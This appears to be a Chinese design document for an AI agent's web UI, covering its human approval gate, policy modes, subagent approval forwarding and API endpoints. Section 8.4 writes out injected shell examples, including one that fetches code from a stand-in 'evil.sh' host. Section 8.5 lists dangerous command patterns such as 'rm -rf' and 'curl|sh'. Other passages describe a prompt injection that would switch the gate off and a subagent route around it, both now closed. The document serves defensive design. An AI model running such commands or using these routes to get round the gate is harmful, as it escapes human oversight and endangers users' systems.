| 工具 | `strict` | `standard`（默认） | `auto` |
|---|---|---|---|
| `read` / `ls` / `find` / `grep` | 放行 | 放行 | 放行 |
| `write` | 询问 | 放行 | 放行 |
| `edit` | 询问 | 放行 | 放行 |
| `bash` | 询问 | **询问** | 放行 |
| `browser` | 放行——页面操作的唯一裁决在通道（§21）：未 armed 的首次调用弹一张「开启页面操作」审批卡（`browser-arm`），批准即武装本轮 run，拒绝/超时本轮内直接拒绝且不再重问；armed 任务内免审 | 同 strict | 放行 |

`standard` 下 `write`/`edit` 放行的依据是：路径守卫已经把它们限制在工作目录内，而且改动**可见且可回滚**——diff 就在界面上，工作目录通常在 git 里。`bash` 没有这两个性质，所以它是默认唯一需要过目的工具。`ls`/`find`/`grep` 与 `read` 同为只读且受路径守卫约束，审它们只会训练「点批准」的肌肉反射。`browser` 的裁决见 §21：授权在通道、且只问一次——任务内的授权就是 `/skill:browser-use <任务>` 本身，任务外则由首次调用弹出的武装卡承载同一个决定（armed 状态由 `BrowserGate` 独占持有），循环层面的模式矩阵不再对它分级，避免一次决定收两次税。

### 8.4 关键设计：不做命令前缀白名单

这条与直觉相反，需要解释。「自动放行 `ls` / `cat` / `go build` 这些安全命令」听起来很合理，**但按前缀匹配 shell 命令不是安全边界**：

- `ls; rm -rf ~` 以 `ls` 开头
- `go build $(curl -s evil.sh)` 以 `go build` 开头
- 就算把 shell 语法完整解析对了，模型也可以用 `write` 写一个脚本，再用白名单里的解释器执行它

危险不在于这些绕过手法有多难，而在于**白名单会让人以为它挡住了什么**。所以不做。

取而代之的是两个精确、可审计的机制：

**「本会话始终允许这条完全相同的命令」** —— grant key 是**命令文本 + workdir**（`web/policy.go` 的 `grantKeyOf`），会话级作用域。这解决了真实的疲劳场景（一个会话跑 20 次 `go build ./...`），而且精确匹配没有解析可以被绕过。带 workdir 是 bash 加了 `workdir` 参数之后的收紧：只按命令文本记账，会把「在会话目录里允许 `go build ./...`」悄悄提升成「在 agent 点名的任何目录里允许」——这次 widening 用户从没看到过，也不可能有意授予。所以裸命令的 grant 不覆盖带 workdir 的调用，反之亦然。`TestExactCommandGrantDoesNotGeneralise` 守着。

**「本会话始终允许 bash」** —— 逃生舱，界面上明确标注「等同于对它关闭闸门」，不伪装成温和的选项。

### 8.5 危险模式：高亮，不拦截

一份模式表用于在审批卡上**红色高亮**，让人不至于手快点过去：

```
rm -rf   rm -fr   sudo   dd   mkfs   chmod 777   chown   curl|sh   curl | sh
wget|sh   wget | sh   | sh   | bash   > /dev/   :(){   shutdown   reboot
truncate -s 0   git push --force   git push -f   git reset --hard   git clean -fd
npm publish   docker rm   kubectl delete
```

**这是给人看的提示，不是防护。** 它不拦截、不影响策略判定。把它当防护会重犯 §8.4 的错误。

命中时唯一的行为效果：该次批准**不允许**被记入「始终允许」（前端禁用勾选框，服务端也强制），防止一次手快永久放开。

### 8.6 超时协商

YX 这块设计得最讲究：`rewrite_begin` 冻结服务端超时计时，`rewrite_cancel` 按返回的 `remaining` 秒恢复。原因是改命令要花时间，不能改到一半被判超时。整套借鉴，改两处：

**改一：下发绝对 `deadline`（epoch ms），不下发秒数。** YX 下发秒数、前端自己起倒计时，刷新一次就对不上。绝对时间戳让客户端本地算剩余，**这是快照重连能正确恢复审批卡的前提**。

**改二：显式 `gate_resolved` 事件，不靠文本匹配。** YX 判定失效是在 observation 文本里找「用户未确认或确认超时」这句话（`index.vue:1131`），字符串一改就失灵。

暂停时另发 `gate_deadline{frozen:true,remaining_ms}`，并把暂停状态放入 `pending_gates` 快照；恢复时发 `frozen:false` 和新的绝对 deadline。前端按服务端时钟偏差计算倒计时，暂停时固定显示剩余时间，避免刷新或客户端时间偏差让仍在等待的审批变成「已失效」。

**超时的默认动作是拒绝**，不是放行——无人值守的闸门必须 fail closed。拒绝理由回给模型，loop 继续。

超时时长可调：`-gate-timeout`（默认 5 分钟）。

### 8.7 闸门的 Go 实现

```go
func (g *WebGate) Review(ctx context.Context, req agent.GateRequest) agent.GateDecision {
    if rule, auto := g.policy.Decide(req); auto {
        g.hub.Publish(evGateAuto{req, rule})   // 自动放行也留痕，但不弹卡
        return agent.Allow
    }

    // 两条串行泳道：主会话一把 serialMain，委派运行一把 serialSub（req.Origin 非空
    // 走后者）。每条泳道同时只有一张卡；两条互不阻塞——后台委派的审批卡可能横跨
    // 很多个 run 无人应答，共用一条泳道会让它把主会话自己的审批压在后面一整个
    // 闸门超时，那样的挂起与模型卡死无法区分。
    lane := &g.serialMain
    if req.Origin != "" { lane = &g.serialSub }
    lane.Lock()
    defer lane.Unlock()

    // 排在别人后面等待的这段时间里，run 可能已经被取消了：开卡前先查一次。
    if err := ctx.Err(); err != nil {
        return agent.Deny("Run was cancelled")
    }

    p := g.open()                 // 注册 pending，返回 decide/freeze/thaw 三个 channel
    defer g.close(p.id)
    // 排队期间可能切换模式或记住授权。先注册，再重查，避免 ApproveAll 漏掉新等待者。
    if rule, auto := g.policy.Decide(req); auto {
        g.hub.Publish(evGateAuto{req, rule})
        return agent.Allow
    }

    danger := Danger(req)
    deadline := time.Now().Add(g.timeout)
    g.hub.Publish(evGateRequest{p.id, req, deadline, danger})

    // 一个可重置的 timer。不要在 for 里 defer t.Stop()——那会累积 defer 直到函数返回。
    timer := time.NewTimer(time.Until(deadline))
    defer timer.Stop()
    var frozen bool
    var remaining time.Duration
    for {
        select {
        case v := <-p.decide:
            // 命中危险模式的批准不能记入「始终允许」。Origin 调用的也不能：grant 是
            // 会话级的，记住一次委派的批准等于让子运行拓宽用户自己调用的判定标准。
            if v.Allow && v.Remember != "" && len(danger) == 0 && req.Origin == "" {
                g.remember(v.Remember, req)
            }
            g.hub.Publish(evGateResolved{p.id, v, "user"})
            return decisionOf(v)

        case <-p.freeze:                        // 用户开始改写参数
            if !frozen {
                frozen, remaining = true, max(0, time.Until(deadline))
                timer.Stop()
                g.hub.Publish(evGateDeadline{p.id, deadline, true, remaining})
            }

        case <-p.thaw:                          // 用户取消改写
            if frozen {
                frozen = false
                deadline = time.Now().Add(remaining)
                timer.Reset(remaining)
                g.hub.Publish(evGateDeadline{p.id, deadline, false, 0})
            }

        case <-timer.C:
            g.hub.Publish(evGateResolved{p.id, false, reason, "timeout"})  // 对外同样发布
            return agent.Deny(reason)

        case <-ctx.Done():
            g.hub.Publish(evGateResolved{p.id, false, "Run was cancelled", "cancel"})
            return agent.Deny("Run was cancelled")
        }
    }
}
```

`Review` 在 Runner 的 goroutine 里阻塞等人，**但 Hub 和 SSE 完全不受影响**——这是「run 的寿命属于 session」带来的直接好处。浏览器可以关掉、刷新、换个标签页回来，审批卡还在那儿等着。

### 8.8 审批卡的界面

`ApprovalBar.vue` 固定在输入区上方，直接读取当前会话的 `pending_gates`，不依赖工具消息是否已经到达、历史滚动位置或工作日志的折叠状态。主会话与后台子 Agent 同时待审时可切换查看；展开详情复用 `GateCard.vue`，原时间线中也保留完整卡片：

```
┌ 需要你确认 ─────────────────────── 剩余 47s ─┐
│ bash                                          │
│ ┌───────────────────────────────────────────┐ │
│ │ rm -rf ./build && go build ./...          │ │
│ └───────────────────────────────────────────┘ │
│ ⚠ 命中危险模式：rm -rf （只是提示，不是拦截）   │
│                                               │
│ [批准]  [改写]  [拒绝]                        │
│ □ 本会话始终允许这条完全相同的命令  ← 命中危险 │
│                                    模式时禁用 │
└───────────────────────────────────────────────┘
```

- 「改写」→ `gate_freeze` → 变成可编辑文本框（bash 是等宽单行框；其他工具是 JSON 编辑）→ 提交走 `gate_decide{allow:true, args:{...}}`；取消走 `gate_thaw`
- 倒计时是纯展示（按服务端时钟校准，从绝对 `deadline` 计算），**服务端计时为准**
- 固定审批栏和时间线共享提交状态；网络错误显示原因并允许重试，不把本次失败误认为审批已完成
- `origin` 必须从事件传到卡片；后台审批跨 `run_end` / `run_start` 保留，不能随主会话轮次清空。含待审调用的工作日志内层也保持展开
- 历史回放里残留的未决卡显示为「已失效」（`live` prop 判定）
- `auto` 模式不弹卡；状态由输入区 PolicyPicker 的橙色「完全访问」按钮承担

### 8.9 全自动模式与斜杠命令

**web 输入框目前唯一可执行的斜杠命令是 `/compact`**（把对话替换为它的摘要；运行中返回 409，入口同时挂在 ContextMeter 的压缩按钮上）。其余命令的入口都已变成专门的控件：`/auto`、`/strict`、`/standard` 移到了输入区的 **PolicyPicker**（三档模式，auto 是橙色的「完全访问」按钮，限轮时的剩余轮次直接显示在按钮上）；模型切换走 ModelPicker；用量在 ContextMeter 的 popover 里。这些命令留下来只会是 TUI 习惯的复读，所以退役——TUI 自己的命令表（含 `/compact`）不动。

**缩写机制还在，但目前没有可缩写的命令。** 唯一的 `/compact` 标了 `noAbbrev`：「`/c` + 回车」两个键就换掉整段对话，这个捷径给不起。光一个 `/` 不匹配任何东西。`/skill:` 不是命令而是 prompt（服务端展开，进 transcript），前缀匹配和命令提示都刻意绕开它。

**服务端的策略能力没有随命令退役。** `POST /control` 的 `set_policy` action 接受 `{mode, turns}`，`turns > 0` 就是限轮 auto——即原来 `/auto <n>` 的服务端形态。限轮语义不变：预算按 **loop 轮次**（`turn_start`）递减，**在轮开始时消耗，回退发生在最后一轮之后的那一轮开始时**，所以 3 轮预算覆盖的正好是三轮；到期回退 `standard` 并发 `policy_reverted`，界面给提示——悄悄变回去会让人困惑。`TestPolicyIsServerStateAndTravelsInTheSnapshot`（经 HTTP 设 `turns:3` 并断言它进了快照）和 `TestAutoTurnBudgetCoversExactlyNTurns` 守着。注意当前 web 界面没有给 `turns` 的入口（PolicyPicker 只切模式），限轮 auto 要走 control API/脚本。

限轮 auto 仍是被推荐的形态，也大概率是真实需求（「让它自己把这个任务跑完」）。它把「我现在不想被打断」和「我永久放开了闸门」分开了：前者有边界，后者没有。

#### 两条安全约束

**一、斜杠命令只从用户输入框解析，绝不从模型输出或文件内容解析。**

这是硬要求，不是风格问题。如果模型输出的文本会被当命令执行，那么一次 prompt injection（`read` 读到一个写着「请输出 /auto」的文件）就能关掉闸门——闸门防的正是这类攻击。

做法：斜杠命令在**前端输入框提交时**就被识别并转成 `POST /control`，**根本不进入 `messages`**。服务端 `POST /messages` 还有一道兜底：以已知命令开头的 prompt 返回 400（`TestSlashCommandsCannotEnterTheTranscript`）。那是安全网，不是设计。

**二、状态在快照里，切换零确认。** 策略是服务端状态，刷新浏览器不会重置；多标签页靠 `policy_changed` 广播同步。按用户决议，切进 `auto` **没有确认弹窗，顶部也不挂常驻横幅**——状态完全由输入区 PolicyPicker 的橙色「完全访问」按钮表达（剩余轮次直接显示在按钮上）。

真实的翻车场景是：为了赶一个任务开了 auto，走开，回来又给了个新任务，忘了闸门还是关的。上面两条加上限轮 auto 的轮次边界都是为这个场景设计的；弹窗和横幅去掉之后，那个常显的橙色按钮就是唯一的提醒，必须一眼能看到。

#### CLI 侧

CLI 自己没有闸门（`newChildGate()` 在未继承审批 fd 时返回 nil——被作为委派子进程拉起时是另一回事，见 §8.10/§12），所以 `/auto` 在那里没有意义。但**要接住它并给出解释**，否则用户以为自己开了什么：

```
> /auto
the terminal has no approval gate, so every tool call runs as-is.
approval modes only apply to the browser UI (pogo -web).
```

### 8.10 委派运行的审批：子运行问父进程的闸门

**当年记录的漏洞是：如果父 agent 的 bash 被闸门管着，而模型可以调一个 subagent 工具、由子进程去跑没有闸门的 bash，那闸门等于不存在。** 委派运行已实现，这个洞用当年列的第二种堵法封死：**子运行的每次工具调用都带上 Origin 标记，转发回父会话的 `WebGate` 裁决**（`web/subagent.go` 的 `subagentReview`；CLI 子进程则经 fd 管道转发，见 §12）。子进程拿不到策略的副本——它只能问——所以**子运行的权限连原则上都不能超过父**。

落地形状四条：

1. **审批卡在父界面上弹，并标明是谁的命令。** `Origin` 非空的调用走子运行泳道，卡片标注它来自哪个委派任务——一条用户从没要求过的命令，不说明是谁要的就没法审。父子共用一个 `WebGate`、一个 Policy、一份危险模式表。
2. **两条串行泳道，互不阻塞**（§8.7）。后台委派的审批卡可以横跨多个 run 等人，共用一条泳道会让它把主会话自己的审批压在后面一整个闸门超时。
3. **Origin 调用的批准不能被记为「始终允许」**（`web/gate.go` 的 decide 分支强制）。grant 是会话级的，记住一次委派的批准等于让子运行拓宽用户自己调用的判定标准——不变式的方向恰好相反，而这是唯一可能反转它的地方。
4. **启动时校验超时不等式。** 委派运行的审批在 §9 的整批预算**之外**：子进程是执行阶段才拉起的，它的每个问题可以等满一个 `-gate-timeout`，N 个并发子进程就是 N 个。所以 `web/subagent.go` 的 `CheckApprovalBudget` 在启动时校验「整批审批预算（运行超时/2）+ N × 闸门超时 ≤ 运行超时」，不成立就拒绝启动——否则把 `-gate-timeout` 调大之后，run 会死在自己的 deadline 上，每个调用都报「已中止」而没有任何解释。

当年列的另两个堵法（子进程工具集受限不给 bash、subagent 只在 auto 模式可用）因此都没有采用。

---

## 9. 闸门 × 并行的接缝

并行策略本身见 `harness-design.md` §5（`read`/`write`/`edit` 并行 + per-path 锁，**`bash` 串行**）。这里只讲两个特性的交界：

接缝的形状是**审批串行、执行并行**：并行的 N 个受管调用依次弹卡，全部批准后再并行跑。每条泳道同时只有一张卡（主会话与委派运行各一条，§8.7），不用设计卡片堆叠。

它由**两层**共同保证，分工要说清楚：

- `agent/loop.go` 的 `review()` 在派发之前把整批逐个审完，这一层给出的是**顺序**：卡按 `tool_use` 的顺序出现。
- `WebGate` 每条泳道一把 mutex（`serialMain` / `serialSub`）保证**同时只有一张**，对任何非循环的调用方也成立（`TestGateSerialisesConcurrentReviews` 并发调 `Review` 四次并断言 `pending_gates` 恒为 1）。

> 这一段原来写的是「顺序 = `tool_use` 顺序，确定性的」，而在 loop 那层做之前**这句话是错的**：mutex 交给先抢到的 goroutine，实测三个调用的审查顺序会是 `call2 call0 call1`。现在它成立了，但成立的原因在 loop 里，不在这把锁里。

**一个客户端必须知道的后果：不能预先批准一整批。** g2 在 g1 被解决之前不存在，所以「全部批准」只能做成随到随答。一口气 POST 三个 `gate_decide` 的脚本，后两个会因为对象还不存在而被静默忽略，然后各自等满超时。

~~代价是 N 个调用各有自己的超时窗口，最坏情况一批花 N × `-gate-timeout`。~~ 这个说法已被 **ReviewBudget** 封顶：整批审批的总预算是运行超时的一半（`web/manager.go` 的 `ReviewBudget: RunTimeout / 2`——一半用来等人，另一半留给活本身）。逐个审意味着等待是累加的，没有上限的话八个没人理的调用各等五分钟就能耗死一个三十分钟的 run，然后 run 自己的 deadline 杀掉一切、每个调用都报「已中止」而没人知道为什么。预算耗尽后，批内其余调用不再开卡，直接以一条模型能读懂的「本批审批预算已在前面的调用上耗尽，请重新发起或请用户早点批准」文本落账（`agent/loop.go` 的 `reviewBudgetSpent`，`is_error` 的 tool result，run 继续）。上界因此是**预算 + 至多一个闸门超时**（已在审的那个允许问完），且第一个调用永远问得出口——一个能拒绝一切的预算等于闸门坏了。对人这仍是对的（一次只问一个问题），对脚本化的超时预算按「半个 run」算而不是按 N 算。

**委派运行的审批不在这个预算里。** 子进程是派发之后才拉起的，它的问题到达时审查阶段早已结束，每次可以等满一个 `-gate-timeout`，N 个并发子进程就是 N 个——由 §8.10 的启动不等式兜底。

由于 `bash` 默认串行，实践中同时需要审批的情况本来就很少——两个默认值互相配合。顺序批次**刻意**逐个 review-then-run，而不是先审完再跑：看过第一条命令的结果再批准第二条，比闭着眼批准两条好。

**对 CLI 渲染器的连带影响**：并行后 `tool_start` / `tool_end` 会交错，原来「一次调用 = 相邻两行」的配对断了。解决办法是本批只要并行过就在结果行前加工具名，且标签在整批期间保持（只在 `inFlight > 1` 时加会让最后一行丢标签）。

**Web 端不需要处理交错**：事件带 `call_id`，前端按 id 归位。这正是「`call_id` 作为一等标识」的价值。

---

## 10. 前端

本节已移至 `web-ui-frontend.md`：web/ui 的规模与结构、数据层、渲染层、主题系统、dock 与面板、输入区、Element Plus 与包体、测试现状都在那边，数字按 2026-08 快照实测。给后端读者留的指针：

- 发给浏览器的 snapshot 字段（`usage` 是计费口径、`context_tokens` 是占用口径的区分也在内）见本文 §6、§7。
- `Hub.Seed()` 如何用 `session.Store.TimedMessages` 把会话文件还原成快照（details 进边表、消息带 `ts`）见 §7。
- 事件协议是前后端唯一的事实来源：前端 `api/types.ts` 是 `web/wire.go` 的人工镜像，协议要变先变 wire.go。
- 置顶 / 改名以追加 meta 记录落盘（`Meta.Pinned/Title` 取最后非 nil，创建记录不改写，transcript 保持 append-only），接口见 §11。
- 闸门（§8）与并行接缝（§9）在浏览器里的呈现全部由事件驱动，UI 不自己发明状态。

---

## 11. 接口清单

```
GET    /api/auth/status                 登录方式探测（token / password），SPA 据此决定显示哪道门；
                                        三个 auth 端点不过 token 中间件——它们自己就是门
POST   /api/login                       账号密码登录（POGO_USERS_FILE 启用时），发 session cookie（§8.1）
POST   /api/logout                      注销
GET    /api/models                      模型目录（configured / key_env / subagent_model）
GET    /api/skills                      已加载的 skills（name/description/path/dir/source）
GET    /api/skills/content              单个 skill 的 SKILL.md 只读查看（§19 技能与工具 sheet；
                                        只接受加载器已审过的名字，没有可指别处的路径参数）
POST   /api/skills/upload               zip 上传安装 skill（UI 上传与脚本安装同一个端点）
GET    /api/skills/sample               可下载的 skill 样例包（内存生成，与校验器同处，两者不会漂移）
GET    /api/tools                       平铺的工具目录：部署方有什么工具、各吃什么参数（§19 按工具视角）
GET    /api/config                      providers 配置文件现状 + 各 provider 是否有环境变量 key
PUT    /api/config                      保存 providers 配置（设置对话框）
GET    /api/starters                    当前生效的 starter 卡（每请求重读，§20）
PUT    /api/starters                    保存 starter 卡编辑（持久化到状态根，POGO_STARTERS_FILE 可改）
GET    /api/panels                      已注册面板清单（§19 散文，此为索引行）
POST   /api/panels                      运行时注册面板（按 URL 幂等，持久化 panels.json，§19）
GET    /api/sessions                    会话列表 + cwd + model + skills；title 派生自转录首条用户消息，
                                          该落盘在 run 内完成（带图时要等 describe），空窗期由内存 overlay
                                          （Manager.LiveTitles 读 Hub fold 的首条用户消息）补齐，只填空不覆盖
POST   /api/sessions                    {model?, workspace?} 新建 → 201 {session_id, path,
                                          model, provider, workspace}；workspace 是服务根下的
                                          相对目录（"" = 根），成为该会话的工作目录（§18.3）
GET    /api/sessions/sample             可导入的导出格式样例（字面量路由，Go 1.22 ServeMux 规则下
                                        优先于 {sid} 通配，样例下载永远不会被读成会话 id）
POST   /api/sessions/import             从导出的 JSON 建会话（单个，或 {"sessions":[...]} 批量）
GET    /api/sessions/{sid}              {session_id, snapshot}
GET    /api/sessions/{sid}/transcript   会话 transcript；dock 的 subagent sheet 轮询它盯仍在跑的
                                        子运行——每次新 Open 而不收养进 manager，读不会启动任何东西
GET    /api/sessions/{sid}/export       导出为可移植 JSON
PATCH  /api/sessions/{sid}              {title?, pinned?} 重命名 / 置顶
DELETE /api/sessions/{sid}              204；运行中 → 409。连带回收该会话的上传文件：转录记录与
                                        uploads/.cache/sessions/ 台账并集归因，仅当同工作区没有其他
                                        存活会话的转录提及该路径时才删除；派生缓存（.cache 按内容
                                        哈希的元数据/描述）随宿主文件清扫，会话台账一并移除
POST   /api/sessions/{sid}/messages     {prompt, attachments?, client_id?} → 202 {run_id}；已有 run → 409。
                                        client_id 是发送方乐观气泡的 id，随 user_message 事件回显，
                                        占位气泡据此退场（不落盘，只调和当次实时折叠）
POST   /api/sessions/{sid}/attachments  multipart 上传一个文件到会话工作区 uploads/ → {path, name, kind,
                                        mime, size, ...}；落盘即发布 attachment_uploaded 事件
GET    /api/sessions/{sid}/attachments  该会话已上传文件列表（转录块 ∪ 台账归因，磁盘上已消失的
                                        自动剔除）：「本会话的文件」浮层的初始数据，之后由事件保持新鲜
GET    /api/sessions/{sid}/stream[?from=] SSE
POST   /api/sessions/{sid}/control      cancel / steer（§7.7）/ set_model / set_policy（含 turns，§8.9）/
                                          gate_decide / gate_freeze / gate_thaw（§8）/ compact（§8.9）/
                                          rewind / rewind_preview（§18）/ subagent_cancel（§12）/
                                          browser_result 已退役（410，§21）
GET    /api/sessions/{sid}/terminal     websocket：会话内的 pty shell（§17）
GET    /api/files?path=                 目录列表：目录优先排序、跳过 .git、500 条截断（§16）
GET    /api/files/content?path=[&raw=1]   文本预览（256KB/5000 行截断，NUL 判二进制只报 mime）；
                                          raw 仅限嗅探为 image/* 的响应且带 nosniff（防同源脚本）
PUT    /api/files/content                 {path, text, base_mtime_ms, force?} 面板内保存：mtime 乐观并发
                                          （漂移 → 409 带 current_mtime_ms）、原子替换保权限位、过 journal、
                                          不过审批闸门（用户本人操作）；二进制/NUL 文本拒绝
GET    /api/files/index                   quick-open 路径索引（跳过 .git/node_modules/dist，2 万条上限）
POST   /api/files/mkdir                   {path} 在工作区下建**一层**目录，给工作区选择器的
                                          「新建文件夹」用；缺父目录是 404，不默默实体化整条路径
GET    /api/workspace/changes             工作区改动列表（A/M/D + ±统计 + sid，来自 file journal，§16 M4）
GET    /api/workspace/diff?path=          对首次改动前基线的累积 unified patch（超 2MB/5000 行只给统计）
POST   /api/workspace/journal/clear       清空基线（diff 从此刻重新累积）
GET    /api/workspace/git                 真 git 状态：分支/上游/ahead/behind/改动计数/仓库根
                                          （失败一律是可渲染的状态，永远 200，§18.6）
```

`/api/files*` 三个端点的 `path` 全部过 `tools.Resolve`——和 agent 自己的工具是**同一套** canonical 逃逸检查，浏览器不会比模型看得更远。

快照的字段树（`wire.go` 的 `Snapshot` 是事实来源）。写在这里是因为 curl 的人手上没有 `types.ts` 那份对照，而**待决闸门在 `live` 里、不在顶层**这一点踩过一次：按顶层取会永远读到空，看起来就像闸门没生效。

```
{ session_id, snapshot: {
    seq, messages[], results{call_id: {...}},
    run:    { run_id, active, model, provider, context_window, ... },
    live:   { run_id, active, text, thinking,
              pending_tools[],           ← 已开始未结束的调用
              pending_gates[],           ← 待人批准的调用（不在顶层！）
              incoming[] },              ← 参数仍在流式生成的调用（tool_args 折入）
    policy: { mode, remaining_turns },
    usage:  { input, output, cache_read, reasoning },   ← 累计，计费口径
    bg_tasks[],                     ← 后台委派任务（运行中与刚结束的；§8.10/§12）
    context_tokens,                 ← 最近一轮 prompt，占用口径
    overhead_tokens,                ← 固定开销估算（system prompt + 工具 schema）
    overhead_breakdown[],           ← 固定开销分项 {kind, name, tokens, count?}：提示词分段、单个工具、Skill 工具组、MCP server
    clear_trigger,                  ← context clearing 的触发线（关闭时缺省；仪表的色带按它画）
    followups                       ← 最近一次生成的追问 chips（挂在哪条 assistant 消息上；§20）
} }
```

`messages` 与 `stream` **分开**是有意的：发起和订阅解耦，才能做到「发起的那个连接死了，run 照样活着」。这也是与 YX 的 `POST /agent/query` 直接返回 SSE 流最大的结构差异——那种结构下发起连接就是唯一连接，断了就没了。

列表项里的 `skills` 是会话**创建时**记录的那一组，不是服务器当前加载的那一组。两者不同就说明这个会话不再可复现 —— 界面上还没有用到这个字段。它曾经在 Go 侧只写不读，那段历史与修法见 `harness-design.md` §8「resume 时的元数据」。

**损坏的会话文件**：`session.Open` 的诊断目前只打到**服务端控制台**，浏览器没有展示位置。CLI 那条路径会打到 stderr。见 `harness-design.md` §8「损坏恢复」。

**没有 `-p` 的 Web 等价物**（不做「提交任务 → 拿 run_id → 轮询」那套）。

---

## 12. `-p` 与 subagent 的关系

`-p` 不做 Web 化，它留给 subagent 和脚本。当年记下的三件事，如今两件的答案已经落地，一件被证明说反了：

**JSON 输出已实现，名叫 `-mode json`。** 父进程要的结构化结果有了：`pogo -mode json -p "..."` 往 stdout 打 JSONL 事件流（首行是 `session` header，之后每行一个事件），人类可读的诊断一律去 stderr，所以 `| jq` 不用跳过任何横幅。它与 web 共用 `wire` 包的 `FromAgent` 和同一批事件常量（§6.2）——loop 事件的翻译只有一份，浏览器和读 JSONL 的脚本不会 drift 成两种方言。这就是当年预言的「又一个事件消费者」，事件流设计的价值再次被印证。

**终端 `-p` 进程没有审批闸门。** 没有人看的时候 `Review` 只会阻塞到超时然后拒绝，所以终端路径的 `ToolGate` 是 nil（`newChildGate()` 拿不到审批 fd 时的返回值）。这同时保证 `-p` 继续可脚本化。

**但「子进程不能有闸门」说反了：委派子进程有闸门——审批经 fd 管道转发父进程裁决。** 子进程被 `subagent` 工具拉起时继承一对专用 fd（`tools/gatechan.go` 的 `POGO_GATE_FD`；刻意不是 stdin/stdout——stdout 是 `-mode json` 的公共契约，stdin 在非终端下会被当成 prompt 读完），`gatefd.go` 的 `childGate` 把每次工具调用经管道问给父进程，父进程应用**自己的**策略裁决。子进程拿不到策略副本，只能问——所以「子运行的权限连原则上都不能超过父」是结构性的，不是提示词级的。web 会话里父侧就是 §8.10 的 `subagentReview`；闸门超时、危险模式、「始终允许」的禁用全部复用同一套。浏览器工具同理：子进程没有自己的浏览器，经另一对 fd 借父进程的页签（`tools/browserfd.go`，§21）。

**后台委派**是第三种形态：`subagent` 工具以 `background: true` 派发时调用即刻返回，真正的结果晚点经会话的通知通道到达（`<task-notification>` 消息）；`subagent_tasks` 工具列出还没结束的后台子运行。后台任务属于会话而不属于任何 run，所以它的进度走 web 自有的 `subagent_start/frame/end` 事件（§6.2），它的审批走子运行泳道（§8.7），它的浏览器通道则完全拿不到——它比发起它的那一轮活得久，会在用户正用浏览器时攥着页签（§21）。

§8.10 的绕过漏洞已堵，机制如上。

---

## 13. 决议记录

| # | 问题 | 决议 |
|---|---|---|
| 1 | 审批闸门是否进 v1 | **做，且做全**。含改写路径、超时冻结/恢复、跨重连恢复 |
| 1b | 全自动模式 | **`/auto` 斜杠命令**，模式名与命令同名（原 `yolo` 已改名）。推荐 `/auto <n>` 限轮次 |
| 2 | 前端仓库位置 | **单仓 + `embed` 单文件分发**。`web/ui/` 放源码，产物打进二进制 |
| 3 | `Tool` 接口改动碰 loop | **接受** |
| 4 | 并行工具调用 | **做**：read/write/edit 并行 + per-path 锁，**bash 默认串行** |
| 4b | 用 `errgroup` 吗 | **不用**（推翻）。见 `harness-design.md` 决议 4b |
| 5 | `-p` 的 Web 等价物 | **不做** |
| 6 | run 的寿命 | **属于 session，不属于 HTTP 连接**（与 YX 相反）。因此僵尸问题自己兜（§7.5） |
| 7 | 快照是否重放增量 | **不重放**。只给当前状态，日志只存语义事件 |
| 8 | 审批超时的默认动作 | **拒绝**（fail closed），且拒绝只是给模型的信息 |
| 9 | token 的强制范围 | **永远必需，但只覆盖 `/api/*`**（收紧了「绑 0.0.0.0 才强制」，放开了静态资源）。后扩展为**双通道**：token 对脚本与 API 不变；`POGO_USERS_FILE` 启用后浏览器可走账号密码 + session cookie（§8.1） |
| 10 | gate 事件的顺序问题 | **前端容错**，不动服务端并发代码（§6.3） |
| 11 | 会话落盘粒度 | **per-run**，因为运行中读 `agent.Messages()` 是 data race。后演进为**按轮落盘**：`TurnPersister` 从事件流重建 transcript 落盘，不读 `agent.Messages()`——竞争前提不变，绕开的是它（§2） |
| 12 | bash 命令白名单 | **不做**。前缀匹配不是安全边界，白名单只制造虚假安全感（§8.4） |

---

## 14. 雷区清单

### 前端

1. **静态资源不能要 token**（§8.1）。往严格改一次就白屏。
2. **快照不重放 `run_end`**。任何「等运行结束」的逻辑必须同时接受 `snapshot.run.active == false`。
3. **`gate_request` 可能先于它引用的 `message` 到达**（§6.3）。`timeline.ts` 的 `adoptOrphanGates` 兜住这条，别删。
4. **不要在 JS 里重新算 diff**（`web-ui-frontend.md` §3）。
5. **斜杠命令在输入框提交时就转成 `POST /control`，绝不进 `messages`**（§8.9）。
6. **markdown 只在消息定稿后渲染一次**，流式期间渲染纯文本。
7. **UI 折叠态别塞进数据模型。** 展开/折叠留在组件里——YX 把它们混进了持久化的 `Turn`，回放时得连 UI 态一起还原。
8. **`web/ui/dist` 被 embed，所以它进版本库**（`web-ui-frontend.md` §7）。

### 服务端

9. **`tool_result` 必须与 `tool_use` 一一配对且同序**，取消时也要凑齐。
10. **`Details` 绝不进 LLM 上下文**，但要进会话文件。它挂在 `llm.Block.Details` 上，靠 `convert.go` 逐字段构造 wire 结构体来保证上不去 —— 别把那里改成整体 marshal。
11. **运行中不能读 `agent.Messages()`** —— data race。UI 要的消息一律从 Hub 拿。
12. **终止事件必须阻塞发送**（`emitFinal`）。约一半概率丢掉 `agent_end` → 界面永远转圈。
13. **杀子进程要杀整个进程组**，否则取消一轮后 `go test` 还在跑。
14. **可重置 timer 不要在 `for` 里 `defer t.Stop()`。**
15. **不要引 `errgroup`。**
16. **per-path 锁的 key 必须 canonical 化。**

### 安全

17. **`bash` 没有路径限制。** Web 暴露出去等于 RCE 即服务，所以默认 loopback + token + 同源。
18. **斜杠命令绝不能从模型输出或文件内容解析**（prompt injection）。
19. **不要做 bash 命令前缀白名单**（§8.4）。
20. **危险模式表只用于高亮**，唯一的行为效果是禁止「始终允许」。
21. **终端 `-p` 的闸门为 nil 是刻意的**（没有人看，`Review` 只会阻塞到超时然后拒绝）；但委派子进程**有**闸门——审批经 fd 管道转发父进程裁决。§8.10 的 subagent 绕过漏洞已处理，机制见 §12。

---

## 15. 未完成的工作

### 15.1 功能缺口

委派运行（含 `-mode json` 输出与审批 fd 转发）、按轮落盘、深色模式这几项已完成，移入 §2。仍成立的缺口：

| 缺口 | 说明 | 量级 |
|---|---|---|
| 会话树分支跳转可视化 | fork 已落地，但不是当初设想的分支可视化：`Store.Fork()` 由**撤回**（§18）使用，被放弃的分支从 head 不可达而不画出来。「让人看见并在分支间跳转」仍然没做 | — |
| 多标签页会话列表同步 | 策略是广播的，会话列表不是（只在新建/发送/删除时刷新） | S |
| 键盘可达性 | 侧栏会话是 `<li @click>`，键盘和读屏器到不了。按钮和 `ModelPicker` 都是原生元素，没问题 | S |
| bundle 体积 | 单块 1.1MB，Element Plus 全量导入但实际只用了 `ElMessageBox`（删除确认 + 重命名输入）。改按需导入能省一大半，但要留意组件样式依赖它的 CSS 变量 | S |
